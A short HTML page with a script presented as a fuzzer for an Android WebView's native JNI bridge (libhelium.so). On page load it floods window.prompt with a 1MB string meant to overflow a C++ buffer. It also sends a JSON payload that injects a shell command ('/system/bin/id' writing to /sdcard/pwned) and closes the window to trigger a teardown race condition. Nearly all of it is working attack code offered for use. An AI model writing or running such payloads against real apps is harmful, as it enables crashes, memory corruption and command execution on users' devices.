<!DOCTYPE html>
<html>
<head><title>JNI Bridge Fuzzer</title></head>
<body style="background:#000; color:#0f0;">
    <h3>Fuzzing JNI Bridge via window.prompt...</h3>
    <script>
        function fuzz() {
            // 1. Buffer Overflow Attempt: Send a massive 1MB string
            // If C++ uses a 4KB stack buffer, this will crash libhelium.so
            let bigStr = "A".repeat(1024 * 1024);
            
            // 2. Command Injection Attempt: Send common command delimiters
            let cmdStr = '{"command":"test", "args":"; /system/bin/id > /sdcard/pwned"}';

            // 3. Trigger the fuzzer loop
            setInterval(() => {
                try {
                    // We send the massive string through the bridge
                    // The high latency you saw means C++ is busy parsing this
                    window.prompt(bigStr); 
                    window.prompt(cmdStr);
                } catch(e) {}
            }, 100);

            // 4. Trigger the teardown race condition
            // Close the window while C++ is still busy parsing the 1MB string
            setTimeout(() => {
                window.close();
            }, 1500);
        }

        setTimeout(fuzz, 1000);
    </script>
